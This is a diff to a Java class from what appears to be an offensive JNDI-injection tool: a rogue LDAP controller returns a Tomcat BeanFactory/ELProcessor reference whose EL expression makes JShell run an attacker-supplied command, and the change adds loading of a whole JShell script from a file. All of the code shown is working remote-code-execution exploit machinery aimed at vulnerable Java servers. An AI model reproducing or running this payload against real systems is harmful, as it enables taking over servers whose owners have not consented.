@@ -10,6 +10,9 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
+import java.nio.file.Files;
+import java.nio.file.Path;
+
 import static artsploit.Utilities.serialize;
 
 /**
@@ -26,19 +29,32 @@ import static artsploit.Utilities.serialize;
  *  - tomcat-embed-el.jar
  *
  * @author artsploit
+ * @author GEBIRGE
  */
 @LdapMapping(uri = { "/o=tomcat-jshell" })
 public class TomcatJShell implements LdapController {
-    String payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"java.lang.Runtime.getRuntime().exec(${command})\")}"
-            .replace("${command}", "\\\"" + Config.command + "\\\"");
-
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         System.out.println("Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");
 
-        Entry e = new Entry(base);
-        e.addAttribute("javaClassName", "java.lang.String"); //could be any
+        String payload;
 
-        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
+        if (Config.jshellPayloadPath.isEmpty()) {
+            System.out.println("Using Config.command payload");
+
+            payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"java.lang.Runtime.getRuntime().exec(${command})\")}"
+                    .replace("${command}", "\\\"" + Config.command + "\\\"");
+        } else {
+            System.out.println("Using payload from " + Config.jshellPayloadPath);
+
+            var jshellScript = Files.readString(Path.of(Config.jshellPayloadPath));
+
+            payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"${script}\")}"
+                    .replace("${script}", jshellScript);
+        }
+
+        Entry e = new Entry(base);
+        e.addAttribute("javaClassName", "java.lang.String");
+
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                 true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
